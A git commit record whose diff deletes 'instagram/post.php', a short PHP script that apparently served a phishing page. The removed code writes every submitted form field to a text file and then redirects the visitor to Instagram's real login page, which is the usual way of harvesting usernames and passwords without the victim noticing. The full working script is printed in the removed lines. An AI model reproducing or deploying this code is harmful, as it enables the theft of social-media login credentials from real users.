1993428f148aab4d4e6b525903b4c2faa6e1fe47
mak <makindosx@gmail.com>
2019-04-07 04:00:04 +0300

    Delete post.php

--- instagram/post.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$file = "export/data.txt";
-file_put_contents($file, print_r($_POST, true), FILE_APPEND);
-
-?>
-<meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/?source=auth_switcher"/>
